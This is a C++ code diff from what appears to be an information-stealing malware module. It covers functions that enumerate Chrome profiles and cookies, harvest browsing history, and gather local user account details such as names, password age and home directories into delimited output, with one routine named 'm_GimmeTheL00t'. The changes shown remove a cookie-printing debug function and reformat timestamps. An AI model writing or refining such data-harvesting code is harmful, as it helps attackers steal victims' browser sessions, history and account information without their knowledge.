@@ -1,14 +1,6 @@
 #include "mod_info.hpp"
 #include "misc.hpp"
 
-void mod_Info::testData() {
-	for (Chrome_Profile profile : this->m_ChromeProfiles()) {
-		for (Cookie ck : this->m_ProfileCookies(profile.strPath)) {
-			std::cout << ck.strName << "\n";
-		}
-	}
-}
-
 std::vector<std::vector<std::string>> mod_Info::m_GimmeTheL00t(const char* cQuery, const char* cPath) {
 	std::vector<std::vector<std::string>> vcOut;
 	std::string strRandomPath = RandomID(7);
@@ -333,7 +325,7 @@ std::vector<Chrome_History> mod_Info::m_ProfileBrowsingHistory(const std::string
 				nHistory.strURL           = item[0];
 				nHistory.strTitle         = item[1];
 				nHistory.strVisitCount    = item[2];
-				nHistory.strLastVisitTime = item[3];
+				nHistory.strLastVisitTime = TimeToDays(atoll(item[3].c_str()));
 				vcOut.push_back(nHistory);
 			}
 		}
@@ -463,7 +455,7 @@ std::string mod_Info::m_GetUsersData() {
 		strOut += CMD_DEL_2;
 		strOut += usuario.strFullName;
 		strOut += CMD_DEL_2;
-		strOut += std::to_string(usuario.dwPasswordAge);
+		strOut += TimeToDays(usuario.dwPasswordAge); 
 		strOut += CMD_DEL_2;
 		strOut += usuario.strHomeDir;
 		strOut += CMD_DEL_2;
